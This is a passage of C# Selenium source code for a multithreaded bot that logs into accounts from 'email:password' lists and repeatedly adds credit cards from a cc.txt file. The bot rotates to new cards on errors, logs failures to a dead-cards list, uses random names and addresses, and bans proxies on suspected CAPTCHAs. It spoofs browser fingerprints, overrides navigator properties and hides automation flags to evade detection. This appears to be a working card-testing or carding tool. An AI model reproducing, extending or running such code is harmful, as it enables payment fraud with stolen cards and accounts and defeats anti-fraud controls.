                        cardsInUse = globalUsedCards.Count > 0;
                    }
                    
                    if (!cardsInUse)
                    {
                        is_exit = true;
                    }
                    else
                    {
                        AddThreadAction(thread_n, "No cards available yet - waiting for cards to be released");
                    }
                    return;
                }

                AddThreadAction(thread_n, $"Account: {(acc.Contains(':') ? acc.Split(':')[0] : acc)}");
                PrintInfo(thread_n, $"Processing account: {(acc.Contains(':') ? acc.Split(':')[0] : acc)}");
                
                // Safely extract card info for display
                string cardDisplay = "****";
                try
                {
                    if (card.Contains('|') && card.Split('|')[0].Length >= 4)
                    {
                        cardDisplay = "****" + card.Split('|')[0].Substring(Math.Max(0, card.Split('|')[0].Length - 4));
                    }
                }
                catch
                {
                    cardDisplay = "****[invalid format]";
                }
                PrintInfo(thread_n, $"Using card: {cardDisplay}");
                
                string random_line = GetRandomLine(Path.Combine(GetBaseDir(), "sor/listofnames.txt"));

                PrintInfo(thread_n, $"Using name: {random_line}");

                // Get fingerprint randomization
                var fingerprint = GetRandomFingerprint();
                
                // Get unique user agent for this account
                string accountEmail = acc.Contains(':') ? acc.Split(':')[0] : acc;
                var uniqueUserAgent = GetUniqueUserAgent(accountEmail);
                
                AddThreadAction(thread_n, $"UA: {uniqueUserAgent.Substring(0, Math.Min(50, uniqueUserAgent.Length))}...");
                
                ChromeOptions chrome_options = new ChromeOptions();

                List<string> opt = new List<string>
                {
                    "--disable-logging",
                    "--disable-login-animations",
                    "--disable-notifications",
                    "--incognito",
                    "--ignore-certificate-errors",
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                    "--disable-extensions",
                    "--log-level=3",
                    "--enable-unsafe-swiftshader",
                    "--accept-insecure-creds",
                    "--disable-webgl",
                    "--disable-webgl2",
                    "--disable-3d-apis",
                    "--disable-accelerated-2d-canvas",
                    "--disable-accelerated-video-decode",
                    "--disable-background-timer-throttling",
                    "--disable-backgrounding-occluded-windows",
                    "--disable-renderer-backgrounding",
                    "--disable-features=TranslateUI",
                    "--disable-ipc-flooding-protection",
                    $"--window-size={fingerprint["width"]},{fingerprint["height"]}",
                    "--disable-dev-shm-usage",
                    // Enhanced fingerprinting arguments
                    $"--force-color-profile=srgb",
                    $"--disable-gpu-sandbox",
                    $"--disable-software-rasterizer",
                    $"--disable-background-networking",
                    $"--disable-default-apps",
                    $"--disable-sync",
                    $"--no-default-browser-check",
                    $"--no-first-run",
                    $"--disable-client-side-phishing-detection",
                    $"--disable-component-update",
                    $"--disable-hang-monitor"
                };
                
                if (!show_browser) 
                {
                    opt.Add("--headless");
                }
                else
                {
                    // Position windows to prevent overlapping
                    int windowX = (thread_n % 3) * 400; // 3 columns
                    int windowY = (thread_n / 3) * 300; // Multiple rows
                    opt.Add($"--window-position={windowX},{windowY}");
                }
                
                if (is_use_proxy)
                {
                    opt.Add($"--proxy-server=http://127.0.0.1:{localPort}");
                }

                foreach (string i in opt)
                {
                    chrome_options.AddArgument(i);
                }

                chrome_options.AddArgument($"user-agent={uniqueUserAgent}");
                
                // Enhanced preferences for advanced fingerprinting
                chrome_options.AddUserProfilePreference("useAutomationExtension", false);
                chrome_options.AddExcludedArgument("enable-automation");
                chrome_options.AddUserProfilePreference("credential_enable_service", false);
                chrome_options.AddUserProfilePreference("password_manager_enabled", false);
                chrome_options.AddUserProfilePreference("intl.accept_languages", fingerprint["language"]);
                chrome_options.AddUserProfilePreference("profile.default_content_setting_values.geolocation", 2);
                chrome_options.AddUserProfilePreference("profile.default_content_setting_values.notifications", 2);
                chrome_options.AddUserProfilePreference("profile.default_content_setting_values.media_stream", 2);
                
                // Advanced fingerprinting preferences
                chrome_options.AddUserProfilePreference("webrtc.ip_handling_policy", "disable_non_proxied_udp");
                chrome_options.AddUserProfilePreference("webrtc.multiple_routes_enabled", false);
                chrome_options.AddUserProfilePreference("webrtc.nonproxied_udp_enabled", false);
                chrome_options.AddUserProfilePreference("profile.default_content_setting_values.plugins", 1);
                chrome_options.AddUserProfilePreference("profile.content_settings.exceptions.plugins", new Dictionary<string, object>());
                
                // Add experimental options for enhanced fingerprinting
                var experimentalOptions = new Dictionary<string, object>
                {
                    { "excludeSwitches", new[] { "enable-automation" } },
                    { "useAutomationExtension", false },
                    { "detach", true }
                };
                chrome_options.AddAdditionalOption("experimentalOptions", experimentalOptions);
                
                var service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;
                service.SuppressInitialDiagnosticInformation = true;
                service.EnableVerboseLogging = false;
                
                chrome_options.AddArgument("--silent");
                chrome_options.AddArgument("--log-level=3");
                chrome_options.AddExcludedArgument("enable-logging");
                chrome_options.AddExcludedArgument("enable-automation");
                
                try
                {
                    driver = new ChromeDriver(service, chrome_options, TimeSpan.FromMinutes(10));
                    driver.Manage().Timeouts().PageLoad = TimeSpan.FromMinutes(10);
                    
                    // Inject advanced fingerprinting JavaScript
                    IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                    
                    // Override navigator properties for enhanced fingerprinting
                    string fingerprintScript = $@"
                        Object.defineProperty(navigator, 'platform', {{
                            get: function() {{ return '{fingerprint["platform"]}'; }}
                        }});
                        Object.defineProperty(navigator, 'hardwareConcurrency', {{
                            get: function() {{ return {fingerprint["hardware_concurrency"]}; }}
                        }});
                        Object.defineProperty(navigator, 'deviceMemory', {{
                            get: function() {{ return {fingerprint["device_memory"]}; }}
                        }});
                        Object.defineProperty(navigator, 'maxTouchPoints', {{
                            get: function() {{ return {fingerprint["max_touch_points"]}; }}
                        }});
                        Object.defineProperty(screen, 'colorDepth', {{
                            get: function() {{ return {fingerprint["color_depth"]}; }}
                        }});
                        Object.defineProperty(screen, 'pixelDepth', {{
                            get: function() {{ return {fingerprint["pixel_depth"]}; }}
                        }});
                        Object.defineProperty(screen.orientation, 'type', {{
                            get: function() {{ return '{fingerprint["screen_orientation"]}'; }}
                        }});
                        
                        // Override WebGL fingerprinting
                        const getParameter = WebGLRenderingContext.prototype.getParameter;
                        WebGLRenderingContext.prototype.getParameter = function(parameter) {{
                            if (parameter === 37445) {{
                                return '{fingerprint["webgl_vendor"]}';
                            }}
                            if (parameter === 37446) {{
                                return '{fingerprint["webgl_renderer"]}';
                            }}
                            return getParameter.call(this, parameter);
                        }};
                        
                        // Override timezone
                        const originalDateTimezone = Date.prototype.getTimezoneOffset;
                        Date.prototype.getTimezoneOffset = function() {{
                            const timezones = {{
                                'America/New_York': 300,
                                'Europe/London': 0,
                                'Asia/Singapore': -480,
                                'America/Los_Angeles': 480,
                                'Europe/Berlin': -60,
                                'America/Chicago': 360
                            }};
                            return timezones['{fingerprint["timezone"]}'] || 0;
                        }};
                        
                        // Hide webdriver properties
                        Object.defineProperty(navigator, 'webdriver', {{
                            get: function() {{ return undefined; }}
                        }});
                        
                        // Override plugins and mime types for additional randomization
                        Object.defineProperty(navigator, 'plugins', {{
                            get: function() {{ return []; }}
                        }});
                        
                        console.log('Advanced fingerprinting applied successfully');
                    ";
                    
                    try
                    {
                        js.ExecuteScript(fingerprintScript);
                        AddThreadAction(thread_n, "Advanced fingerprinting applied");
                    }
                    catch (Exception fingerprintEx)
                    {
                        PrintWarning(thread_n, $"Fingerprinting injection failed: {fingerprintEx.Message}");
                        AddThreadAction(thread_n, "Fingerprinting injection failed");
                    }
                    
                    AddThreadAction(thread_n, "Browser initialized");

                    string acc_name = random_line;

                    // Local function to add payment with retry logic
                    void Add_payment(string reg_s)
                    {
                        AddThreadAction(thread_n, "Starting payment addition");
                        Task.Delay(2000).GetAwaiter().GetResult();
                        
                        // Click "Add payment method" with enhanced reliability and retry logic
                        IWebElement? addPaymentButton = null;
                        bool addPaymentClicked = false;
                        int addPaymentAttempts = 0;
                        const int maxAddPaymentAttempts = 3;
                        
                        while (!addPaymentClicked && addPaymentAttempts < maxAddPaymentAttempts)
                        {
                            addPaymentAttempts++;
                            
                            // Find the button with multiple strategies
                            addPaymentButton = FindElementWithWaitClickable(driver, By.XPath("//span[text()='Add payment method']"), 15);
                            if (addPaymentButton == null)
                            {
                                // Try alternative selectors
                                addPaymentButton = FindElementWithWaitClickable(driver, By.XPath("//button[contains(., 'Add payment method')]"), 5);
                            }
                            if (addPaymentButton == null)
                            {
                                // Try with partial text match
                                addPaymentButton = FindElementWithWaitClickable(driver, By.XPath("//*[contains(text(), 'Add payment')]"), 5);
                            }
                            
                            if (addPaymentButton == null)
                            {
                                if (addPaymentAttempts == 1)
                                {
                                    // Check if account already has payment method on first attempt
                                    var existingChangeButton = FindElementWithWait(driver, By.XPath("//*[text()='Change']"), 5);
                                    if (existingChangeButton != null)
                                    {
                                        AddToSuccess(acc, card, success_acc, success_cc);
                                        PrintSuccess(thread_n, "Account already has a payment method - added to success");
                                        return;
                                    }
                                }
                                
                                PrintError(thread_n, $"Add payment method button not found (attempt {addPaymentAttempts}/{maxAddPaymentAttempts})");
                                
                                if (addPaymentAttempts < maxAddPaymentAttempts)
                                {
                                    PrintInfo(thread_n, "Refreshing page and retrying...");
                                    driver.Navigate().Refresh();
                                    Thread.Sleep(TimeSpan.FromSeconds(3));
                                    continue;
                                }
                                else
                                {
                                    PrintError(thread_n, "Add payment method button not found after all attempts");
                                    AddToFailed(acc, card, failed_acc, failed_cc);
                                    return;
                                }
                            }
                            
                            // Try to click the button with enhanced error handling
                            try
                            {
                                // Scroll to element to ensure visibility
                                ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", addPaymentButton);
                                Thread.Sleep(TimeSpan.FromMilliseconds(500));
                                
                                // Ensure element is ready for interaction
                                if (addPaymentButton.Enabled && addPaymentButton.Displayed)
                                {
                                    addPaymentButton.Click();
                                    addPaymentClicked = true;
                                    PrintInfo(thread_n, $"Add payment method button clicked successfully (attempt {addPaymentAttempts})");
                                }
                                else
                                {
                                    PrintError(thread_n, $"Add payment button not enabled/displayed (attempt {addPaymentAttempts})");
                                    if (addPaymentAttempts < maxAddPaymentAttempts)
                                    {
                                        Thread.Sleep(TimeSpan.FromSeconds(2));
                                        continue;
                                    }
                                }
                            }
                            catch (Exception clickEx)
                            {
                                PrintError(thread_n, $"Error clicking add payment button (attempt {addPaymentAttempts}): {clickEx.Message}");
                                
                                if (addPaymentAttempts < maxAddPaymentAttempts)
                                {
                                    Thread.Sleep(TimeSpan.FromSeconds(1));
                                    continue;
                                }
                                else
                                {
                                    PrintError(thread_n, "Failed to click add payment button after all attempts");
                                    AddToFailed(acc, card, failed_acc, failed_cc);
                                    return;
                                }
                            }
                        }
                        
                        if (!addPaymentClicked)
                        {
                            PrintError(thread_n, "Could not click add payment method button");
                            AddToFailed(acc, card, failed_acc, failed_cc);
                            return;
                        }

                        Thread.Sleep(TimeSpan.FromSeconds(3)); // Wait for form to start loading
                        
                        // Verify that the payment form starts loading
                        bool formLoadingDetected = false;
                        for (int i = 0; i < 10; i++) // Check for 10 seconds
                        {
                            if (driver.PageSource.Contains("market-selector") || 
                                driver.PageSource.Contains("Credit card") ||
                                driver.PageSource.Contains("Debit card") ||
                                driver.FindElements(By.Id("market-selector-dropdown")).Count > 0)
                            {
                                formLoadingDetected = true;
                                PrintInfo(thread_n, "Payment form loading detected");
                                break;
                            }
                            Thread.Sleep(1000);
                        }
                        
                        if (!formLoadingDetected)
                        {
                            PrintError(thread_n, "Payment form failed to load after clicking Add payment method");
                            AddToFailed(acc, card, failed_acc, failed_cc);
                            return;
                        }

                        Thread.Sleep(TimeSpan.FromSeconds(2));
                        var marketSelector = FindElementWithWaitClickable(driver, By.Id("market-selector-dropdown"));
                        marketSelector?.Click();
                        PrintInfo(thread_n, "Market selector clicked");
                        Thread.Sleep(TimeSpan.FromSeconds(2));

                        if (reg_s == "Thailand")
                        {
                            var thailandOption = FindElementWithWaitClickable(driver, By.Id("market-selector-dropdown-list186"));
                            thailandOption?.Click();
                        }
                        else
                        {
                            var singaporeOption = FindElementWithWaitClickable(driver, By.Id("market-selector-dropdown-list171"));
                            singaporeOption?.Click();
                        }

                        PrintInfo(thread_n, $"Region {reg_s} selected");
                        AddThreadAction(thread_n, $"Selected region: {reg_s}");
                        Thread.Sleep(TimeSpan.FromSeconds(5));
                        var creditCardOption = FindElementWithWaitClickable(driver, By.XPath("//span[text()='Credit card or debit card']"));
                        creditCardOption?.Click();
                        PrintInfo(thread_n, "Credit card option selected");
                        Thread.Sleep(TimeSpan.FromSeconds(5)); // Increased from 2 to 5 seconds to allow card form to load

                        string email = acc.Split(":")[0];
                        string password = acc.Split(":")[1];

                        // Enhanced retry logic for card addition with proper thread safety and global timeout
                        DateTime paymentProcessStartTime = DateTime.Now;
                        const int paymentProcessTimeoutMinutes = 7; // Global timeout for entire payment process
                        
                        int maxRetries = 2;
                        string? currentCard = card;
                        List<string> usedCards = new List<string>();
                        if (currentCard != null)
                        {
                            usedCards.Add(currentCard);
                        }
                        bool shouldExit = false;

                        for (int attempt = 0; attempt <= maxRetries && !shouldExit; attempt++)
                        {
                            // Check global timeout for payment process
                            if ((DateTime.Now - paymentProcessStartTime).TotalMinutes >= paymentProcessTimeoutMinutes)
                            {
                                PrintError(thread_n, $"Payment process timed out after {paymentProcessTimeoutMinutes} minutes - requeuing account");
                                AddThreadAction(thread_n, "Payment process global timeout - requeuing account");
                                RequeueAccount(acc, card);
                                return;
                            }
                            // Get fresh address from address.txt for each retry attempt - strictly required
                            var addressResult = GetAndRemoveAddress(thread_n);
                            if (addressResult == null)
                            {
                                PrintError(thread_n, "No addresses available from address.txt - failing account");
                                AddToFailed(acc, card, failed_acc, failed_cc);
                                shouldExit = true;
                                break;
                            }
                            
                            var (street, city, postal_code) = addressResult.Value;
                            string adrs_1 = street;
                            string adrs_2 = "";
                            Console.WriteLine($"[DEBUG] Using address for attempt {attempt + 1}: {street}");
                            PrintInfo(thread_n, $"Using address for attempt {attempt + 1}: {street}, {city}, {postal_code}");
                            
                            // Safety check - if thread should exit, break out cleanly
                            if (is_exit || currentCard == null)
                            {
                                PrintError(thread_n, "Thread exit requested or current card is null");
                                AddToFailed(acc, card, failed_acc, failed_cc);
                                shouldExit = true;
                                break;
                            }

                            PrintInfo(thread_n, $"Card attempt {attempt + 1}/{maxRetries + 1} with card: {currentCard.Substring(0, Math.Min(8, currentCard.Length))}****");
                            AddThreadAction(thread_n, $"Card attempt {attempt + 1}");

                            try
                            {
                                // Fill card details with timeout protection
                                bool fillSuccess = FillCardDetails(currentCard, reg_s, adrs_1, adrs_2, city, postal_code);
                                if (!fillSuccess)
                                {
                                    PrintError(thread_n, "Failed to fill card details, trying next card");
                                    if (attempt < maxRetries)
                                    {
                                        string? newCard = GetNewCard(usedCards);
                                        if (newCard == null)
                                        {
                                            PrintError(thread_n, "No more cards available for retry");
                                            AddToFailed(acc, card, failed_acc, failed_cc);
                                            shouldExit = true;
                                            break;
                                        }
                                        currentCard = newCard;
                                        card = newCard; // Update the main card variable too!
                                        usedCards.Add(currentCard);
                                        ClearCardFields(driver, thread_n);
                                        PrintInfo(thread_n, "Waiting 0.75 seconds after clearing fields...");
                                        Thread.Sleep(TimeSpan.FromMilliseconds(750)); // Reduced from 1250ms to 750ms
                                        continue;
                                    }
                                    else
                                    {
                                        PrintError(thread_n, "All retry attempts exhausted - fill failure");
                                        AddToFailed(acc, card, failed_acc, failed_cc);
                                        shouldExit = true;
                                        break;
                                    }
                                }

                                // Wait a moment after filling to allow any immediate errors to appear
                                Thread.Sleep(TimeSpan.FromSeconds(3));
                                
                                // Click save button with 3-minute timeout protection
                                DateTime saveButtonStartTime = DateTime.Now;
                                const int saveButtonTimeoutMinutes = 3; // Reduced from 10 to 3 minutes for better responsiveness
                                bool saveButtonFound = false;
                                IWebElement? saveButton = null;
                                
                                PrintInfo(thread_n, "Looking for save button (10-minute timeout)...");
                                AddThreadAction(thread_n, "Searching for save button");
                                
                                while (!saveButtonFound && (DateTime.Now - saveButtonStartTime).TotalMinutes < saveButtonTimeoutMinutes)
                                {
                                    try
                                    {
                                        saveButton = FindElementWithWaitClickable(driver, By.XPath("//span[text()='Save']"), 10);
                                        if (saveButton != null)
                                        {
                                            saveButtonFound = true;
                                            PrintSuccess(thread_n, "Save button found successfully");
                                            break;
                                        }
                                        else
                                        {
                                            PrintInfo(thread_n, "Save button not found, retrying...");
                                            Thread.Sleep(TimeSpan.FromSeconds(5)); // Wait 5 seconds before retry
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        PrintError(thread_n, $"Error searching for save button: {ex.Message}");
                                        Thread.Sleep(TimeSpan.FromSeconds(2));
                                    }
                                }
                                
                                // Check if save button search timed out
                                if (!saveButtonFound || saveButton == null)
                                {
                                    PrintError(thread_n, $"Save button not found within {saveButtonTimeoutMinutes} minutes");
                                    
                                    // Try to detect if there was an immediate error that prevented the save button
                                    if (IsCardError(driver, thread_n))
                                    {
                                        PrintInfo(thread_n, "Save button missing due to card error - jumping directly to card error handling");
                                        // Jump directly to the card error handling logic instead of continuing
                                        goto CardErrorDetected;
                                    }
                                    else
                                    {
                                        PrintError(thread_n, "Save button timeout without detectable card error - requeuing account");
                                        AddThreadAction(thread_n, "Save button timeout - requeuing account");
                                        RequeueAccount(acc, card);
                                        return; // Restart thread
                                    }
                                }
                                
                                // Click the save button with timeout protection for the click action (only if button was found)
                                if (saveButtonFound && saveButton != null)
                                {
                                    DateTime saveClickStartTime = DateTime.Now;
                                    bool saveClickSuccessful = false;
                                    
                                    while (!saveClickSuccessful && (DateTime.Now - saveClickStartTime).TotalMinutes < saveButtonTimeoutMinutes)
                                    {
                                        try
                                        {
                                            saveButton.Click();
                                            PrintInfo(thread_n, "Save button clicked, waiting for response...");
                                            AddThreadAction(thread_n, "Save button clicked");
                                            saveClickSuccessful = true;
                                            break;
                                        }
                                        catch (Exception ex)
                                        {
                                            PrintError(thread_n, $"Error clicking save button: {ex.Message}");
                                            Thread.Sleep(TimeSpan.FromSeconds(2));
                                            
                                            // Try to find the save button again
                                            saveButton = FindElementWithWaitClickable(driver, By.XPath("//span[text()='Save']"), 5);
                                            if (saveButton == null)
                                            {
                                                PrintError(thread_n, "Save button disappeared during click attempt");
                                                break;
                                            }
                                        }
                                    }
                                    
                                    // Check if save button click timed out
                                    if (!saveClickSuccessful)
                                    {
                                        PrintError(thread_n, $"Save button click failed within {saveButtonTimeoutMinutes} minutes - requeuing account");
                                        AddThreadAction(thread_n, "Save button click timeout - requeuing account");
                                        RequeueAccount(acc, card);
                                        return; // Restart thread
                                    }
                                }
                                else
                                {
                                    // Save button was not found, skip to error checking
                                    PrintInfo(thread_n, "No save button to click, proceeding to error checking");
                                }
                                
                                // Wait for response with reasonable timeout
                                Thread.Sleep(TimeSpan.FromSeconds(8));
                                
                                // Additional wait for final processing
                                Thread.Sleep(TimeSpan.FromSeconds(5));

                                // Check if card was successfully added
                                if (IsCardSuccess(driver, thread_n))
                                {
                                    try
                                    {
                                        var closeButton = FindElementWithWaitClickable(driver, By.XPath("//*[text()='Close']"), 10);
                                        closeButton?.Click();
                                        PrintSuccess(thread_n, $"Card added successfully on attempt {attempt + 1}!");
                                        AddToSuccess(acc, currentCard, success_acc, success_cc);
                                        AddThreadAction(thread_n, "Card added successfully");
                                        
                                        // Add unused cards back to the file (thread-safe) - excluding dead cards
                                        var deadCardsPath = Path.Combine(GetBaseDir(), "sor/dead_cards.txt");
                                        HashSet<string> deadCards = new HashSet<string>();
                                        if (File.Exists(deadCardsPath))
                                        {
                                            deadCards = File.ReadAllLines(deadCardsPath)
                                                .Where(line => !string.IsNullOrWhiteSpace(line))
                                                .Select(line => line.Trim())
                                                .ToHashSet();
                                        }
                                        
                                        foreach (string unusedCard in usedCards.Where(c => c != currentCard && !deadCards.Contains(c.Trim())))
                                        {
                                            lock (fileLock)
                                            {
                                                string ccPath = Path.Combine(GetBaseDir(), "sor/cc.txt");
                                                File.AppendAllText(ccPath, unusedCard + Environment.NewLine);
                                            }
                                        }
                                        shouldExit = true;
                                        break;
                                    }
                                    catch
                                    {
                                        PrintSuccess(thread_n, "Card added successfully (Close button error but success detected)");
                                        AddToSuccess(acc, currentCard, success_acc, success_cc);
                                        AddThreadAction(thread_n, "Card added successfully");
                                        shouldExit = true;
                                        break;
                                    }
                                }

                                // Check for card errors
                                CardErrorDetected:
                                if (IsCardError(driver, thread_n))
                                {
                                    PrintError(thread_n, $"Card error detected on attempt {attempt + 1} - Current card: {currentCard.Substring(0, Math.Min(8, currentCard.Length))}****");
                                    AddThreadAction(thread_n, $"Card error on attempt {attempt + 1}");
                                    
                                    // Handle card errors with the existing retry logic
                                    if (attempt < maxRetries)
                                    {
                                        // Mark the current card as dead since it has an error
                                        AddToDeadCards(currentCard, thread_n);
                                        
                                        PrintInfo(thread_n, "Card error - getting new card for retry...");
                                        Console.WriteLine($"[DEBUG] Current local usedCards list: [{string.Join(", ", usedCards.Where(c => c != null).Select(c => c.Substring(0, Math.Min(8, c.Length)) + "****"))}]");
                                        
                                        // Get new card using global tracking
                                        string? newCard = GetNewCard(null); // Global tracking handles exclusions
                                        if (newCard == null)
                                        {
                                            PrintError(thread_n, "No more cards available for retry");
                                            AddToFailed(acc, card, failed_acc, failed_cc);
                                            shouldExit = true;
                                            break;
                                        }
                                        string oldCard = currentCard;
                                        currentCard = newCard;
                                        card = newCard; // Update the main card variable too!
                                        
                                        // Update local usedCards list for backward compatibility
                                        if (!usedCards.Contains(currentCard))
                                        {
                                            usedCards.Add(currentCard);
                                        }
                                        
                                        Console.WriteLine($"[DEBUG] Card Error - Thread {thread_n} - Switch from {oldCard.Substring(0, Math.Min(8, oldCard.Length))}**** to {currentCard.Substring(0, Math.Min(8, currentCard.Length))}****");
                                        PrintInfo(thread_n, $"Card Error - Card switch: {oldCard.Substring(0, Math.Min(8, oldCard.Length))}**** → {currentCard.Substring(0, Math.Min(8, currentCard.Length))}****");
                                        AddThreadAction(thread_n, $"Card switched for retry attempt {attempt + 2}");
                                        
                                        // Clear fields and continue with retry
                                        try
                                        {
                                            ClearCardFields(driver, thread_n);
                                            PrintInfo(thread_n, "Card fields cleared for new card retry");
                                        }
                                        catch (Exception clearEx)
                                        {
                                            PrintError(thread_n, $"Error clearing card fields for retry: {clearEx.Message}");
                                        }
                                        
                                        Thread.Sleep(TimeSpan.FromMilliseconds(1000)); // Reduced from 1500ms to 1000ms
                                        PrintInfo(thread_n, $"Retrying with new card: {currentCard.Substring(0, Math.Min(8, currentCard.Length))}****");
                                        continue; // Continue with new card
                                    }
                                    else
                                    {
                                        // Mark the current card as dead since it has errors and no more retries
                                        AddToDeadCards(currentCard, thread_n);
                                        
                                        PrintError(thread_n, "All retry attempts exhausted after card errors");
                                        AddToFailed(acc, card, failed_acc, failed_cc);
                                        shouldExit = true;
                                        break;
                                    }
                                }

                                // Check for other potential issues (CAPTCHA, etc.)
                                if (attempt == maxRetries)
                                {
                                    PrintError(thread_n, "No success, no clear card error - possible CAPTCHA or network issue");
                                    if (is_use_proxy && !string.IsNullOrWhiteSpace(proxyy))
                                    {
                                        BanCurrentProxy(proxyy);
                                        AddThreadAction(thread_n, "Possible CAPTCHA - proxy banned, account requeued");
                                    }
                                    else
                                    {
                                        AddThreadAction(thread_n, "Possible CAPTCHA - account requeued");
                                    }
                                    RequeueAccount(acc, card);
                                    shouldExit = true;
                                    break;
                                }
                                else
                                {
                                    PrintInfo(thread_n, $"No clear result on attempt {attempt + 1}, waiting 1.5 seconds before retry...");
                                    Thread.Sleep(TimeSpan.FromMilliseconds(1500)); // Reduced from 2750ms to 1500ms
                                }
                            }
                            catch (Exception ex)
                            {
                                PrintError(thread_n, $"Exception during card attempt {attempt + 1}: {ex.Message}");
                                
                                if (attempt == maxRetries)
                                {
                                    AddToFailed(acc, currentCard, failed_acc, failed_cc);
                                    shouldExit = true;
                                    break;
                                }
                                
                                // For non-final attempts, try to continue with a new card
                                if (attempt < maxRetries)
                                {
                                    PrintInfo(thread_n, "Getting new card due to exception...");
                                    string? newCard = GetNewCard(usedCards);
                                    if (newCard != null)
                                    {
                                        string oldCard = currentCard;
                                        currentCard = newCard;
                                        card = newCard; // Update the main card variable too!
                                        usedCards.Add(currentCard);
                                        PrintInfo(thread_n, $"Exception recovery: Switching from card {oldCard.Substring(0, Math.Min(8, oldCard.Length))}**** to {currentCard.Substring(0, Math.Min(8, currentCard.Length))}****");
                                        ClearCardFields(driver, thread_n);
                                        PrintInfo(thread_n, "Waiting 1.0 seconds after exception recovery...");
                                        Thread.Sleep(TimeSpan.FromMilliseconds(1000)); // Reduced from 1750ms to 1000ms
                                    }
                                    else
                                    {
                                        PrintError(thread_n, "No more cards available for exception recovery");
                                        AddToFailed(acc, card, failed_acc, failed_cc);
                                        shouldExit = true;
                                        break;
                                    }
                                }
                            }
                        } // End of for loop
                    } // End of Add_payment method

                    // Helper function to fill card details
                    bool FillCardDetails(string cardData, string reg_s, string adrs_1, string adrs_2, string city, string postal_code)
                    {
                        try
                        {
                            string[] cardParts = cardData.Split("|");
                            string acc_token = cardParts[0];
                            string month = cardParts[1];
                            string year = cardParts[2];
                            if (year.StartsWith("20"))
                            {
                                year = year.Substring(2);
                            }
                            string cvv = cardParts[3].Trim();

                            PrintInfo(thread_n, "Starting card details filling with extended timing for stability...");
                            
                            // Wait for the card form to be fully loaded and ready
                            PrintInfo(thread_n, "Waiting for card form to load completely...");
                            bool cardFormReady = false;
                            DateTime cardFormStartTime = DateTime.Now;
                            const int cardFormTimeoutSeconds = 30;
                            
                            while (!cardFormReady && (DateTime.Now - cardFormStartTime).TotalSeconds < cardFormTimeoutSeconds)
                            {
                                try
                                {
                                    // Check if the accountHolderName field is present and visible
                                    var testElement = driver.FindElement(By.Id("accountHolderName"));
                                    if (testElement != null && testElement.Displayed && testElement.Enabled)
                                    {
                                        cardFormReady = true;
                                        PrintInfo(thread_n, "Card form is ready for input");
                                        break;
                                    }
                                }
                                catch
                                {
                                    // Element not ready yet, continue waiting
                                }
                                Thread.Sleep(500); // Check every 500ms
                            }
                            
                            if (!cardFormReady)
                            {
                                PrintError(thread_n, "Card form failed to load within 30 seconds");
                                return false;
                            }
                            
                            // Additional delay to ensure form is stable
                            Thread.Sleep(TimeSpan.FromMilliseconds(1000)); // Reduced from 2000ms to 1000ms
                            
                            // Generate a fresh random name for each card attempt
                            string freshCardholderName = GetRandomLine(Path.Combine(GetBaseDir(), "sor/listofnames.txt"));
                            PrintInfo(thread_n, $"Using fresh cardholder name: {freshCardholderName}");
                            
                            // Fill account holder name with enhanced reliability
                            var accountHolderName = FindElementWithWaitClickable(driver, By.Id("accountHolderName"), 15);
                            if (accountHolderName != null)
                            {
                                // Clear any existing content first
                                accountHolderName.Clear();
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                
                                // Ensure field is focused
                                accountHolderName.Click();
                                Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                
                                // Type at moderate speed to prevent input issues
                                foreach (char c in freshCardholderName)
                                {
                                    accountHolderName.SendKeys(c.ToString());
                                    Thread.Sleep(25); // Reduced from 50ms to 25ms
                                }
                                
                                PrintInfo(thread_n, "Card holder name entered character by character");
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                
                                // Verify the input was successful
                                string enteredName = accountHolderName.GetAttribute("value") ?? "";
                                if (enteredName.Length < freshCardholderName.Length / 2)
                                {
                                    PrintError(thread_n, "Name input seems incomplete, retrying...");
                                    accountHolderName.Clear();
                                    Thread.Sleep(TimeSpan.FromMilliseconds(100)); // Reduced from 200ms to 100ms
                                    accountHolderName.SendKeys(freshCardholderName);
                                }
                            }
                            else
                            {
                                PrintError(thread_n, "Account holder name field not found");
                                return false;
                            }

                            // Tab to card number field and enter card number with enhanced reliability
                            var nameFieldForTab = FindElementWithWait(driver, By.Id("accountHolderName"));
                            if (nameFieldForTab != null)
                            {
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                                nameFieldForTab.SendKeys(Keys.Tab);
                                Thread.Sleep(TimeSpan.FromMilliseconds(250)); // Reduced from 500ms to 250ms
                            }

                            // Type card number with enhanced reliability
                            Actions actions = new Actions(driver);
                            Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 300ms to 150ms
                            
                            // Type card number at faster speed
                            foreach (char c in acc_token)
                            {
                                actions.SendKeys(c.ToString()).Perform();
                                Thread.Sleep(40); // Reduced from 80ms to 40ms
                            }
                            
                            PrintInfo(thread_n, "Card number entered character by character");
                            Thread.Sleep(TimeSpan.FromMilliseconds(250)); // Reduced from 500ms to 250ms
                            
                            // Verify card number input by checking if the field has content
                            try
                            {
                                var cardNumberField = driver.FindElement(By.XPath("//input[contains(@placeholder, 'Card number') or contains(@id, 'cardNumber') or contains(@name, 'cardNumber')]"));
                                string cardValue = cardNumberField.GetAttribute("value") ?? "";
                                if (cardValue.Length < 10) // Should have at least 10 digits
                                {
                                    PrintError(thread_n, "Card number input seems incomplete, retrying...");
                                    cardNumberField.Clear();
                                    Thread.Sleep(TimeSpan.FromMilliseconds(300));
                                    cardNumberField.SendKeys(acc_token);
                                }
                            }
                            catch
                            {
                                PrintInfo(thread_n, "Could not verify card number input, continuing...");
                            }
                            
                            // Select expiry month with reduced delays
                            var expiryMonthOption = FindElementWithWaitClickable(driver, By.Id("input_expiryMonth-option"));
                            if (expiryMonthOption != null)
                            {
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                expiryMonthOption.Click();
                                Thread.Sleep(TimeSpan.FromMilliseconds(150)); // Reduced from 250ms to 150ms
                                
                                var monthSelection = FindElementWithWaitClickable(driver, By.XPath($"//span[text()='{month}']"));
                                if (monthSelection != null)
                                {
